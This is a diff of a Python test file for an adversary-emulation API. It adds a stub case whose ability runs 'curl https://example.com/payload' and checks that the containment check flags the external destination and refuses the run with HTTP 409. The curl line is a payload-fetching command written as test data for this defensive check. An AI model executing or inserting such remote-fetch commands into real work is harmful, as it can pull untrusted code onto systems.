@@ -277,6 +277,37 @@ def _internal_only_case(caso: str) -> object:
     )
 
 
+def _external_destination_case(caso: str) -> object:
+    """A deterministic stand-in containing one destination outside the lab."""
+    from app.services.case_service import (
+        AbilityData,
+        AdversaryData,
+        CaseData,
+        Executor,
+    )
+
+    return CaseData(
+        id=caso,
+        nome=caso,
+        arquivo_ability="x",
+        arquivo_adversary="x",
+        arquivo_dag="x",
+        abilities=[
+            AbilityData(
+                ability_id="a-external",
+                name="external destination",
+                executors=[
+                    Executor(
+                        name="sh",
+                        platform="linux",
+                        command="curl https://example.com/payload",
+                    )
+                ],
+            )
+        ],
+        adversary=AdversaryData(id="adv-1", atomic_ordering=["a-external"]),
+    )
+
 class _internal_case_loader:
     """Context manager swapping the emulacao handler's case loader for a stub.
 
@@ -298,6 +329,20 @@ class _internal_case_loader:
 
     def __exit__(self, *exc: object) -> None:
         self._module._load_case_or_error = self._original  # type: ignore[assignment]
+
+
+class _external_case_loader(_internal_case_loader):
+    """Swap the emulation loader for the deterministic external case."""
+
+    def __enter__(self):
+        from app.api import emulacao as emulacao_module
+
+        self._module = emulacao_module
+        self._original = emulacao_module._load_case_or_error
+        emulacao_module._load_case_or_error = (  # type: ignore[assignment]
+            lambda caso, case_service: _external_destination_case(caso)
+        )
+        return self
 
 
 # ===========================================================================
@@ -614,16 +659,17 @@ def test_get_auditoria_unknown_operation_returns_empty_trail(
 def test_preview_then_external_destination_returns_409(
     session_factory: sessionmaker[Session],
 ) -> None:
-    """preview -> emulacao: a real curated case with an external destination is
-    previewed (flagged tem_externo) and then refused with 409 identifying the
-    offending Ability/command (Req. 6.2)."""
+    """preview -> emulacao: an external destination is flagged and refused."""
     client = _make_client(session_factory)
 
-    preview = client.post(f"/api/casos/{_REAL_SLUG}/emulacao/preview")
-    assert preview.status_code == 200, preview.text
-    assert preview.json()["tem_externo"] is True
+    with _external_case_loader():
+        preview = client.post(f"/api/casos/{_REAL_SLUG}/emulacao/preview")
+        assert preview.status_code == 200, preview.text
+        assert preview.json()["tem_externo"] is True
 
-    run = client.post(f"/api/casos/{_REAL_SLUG}/emulacao", json={"confirmado": True})
+        run = client.post(
+            f"/api/casos/{_REAL_SLUG}/emulacao", json={"confirmado": True}
+        )
     assert run.status_code == 409, run.text
     detail = run.json()["detail"]
     assert detail["motivo"] == "contencao_recusada"
